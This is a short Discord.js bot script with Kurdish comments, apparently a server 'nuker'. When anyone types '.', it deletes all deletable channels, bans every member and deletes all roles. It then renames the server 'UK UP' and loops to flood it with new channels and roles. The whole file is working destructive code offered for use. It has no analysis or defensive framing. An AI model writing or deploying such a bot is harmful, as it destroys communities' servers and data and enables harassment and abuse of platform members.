const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = "uk";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("UK UP ");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("UK UP ", "text");///////bo channel 
        message.guild.createChannel("UK UP ", "voice");////bo voice
        message.guild.createRole({ name: "UK UP " });////nawek dane bo role kan
      });
    }
  }
});

client.login("")
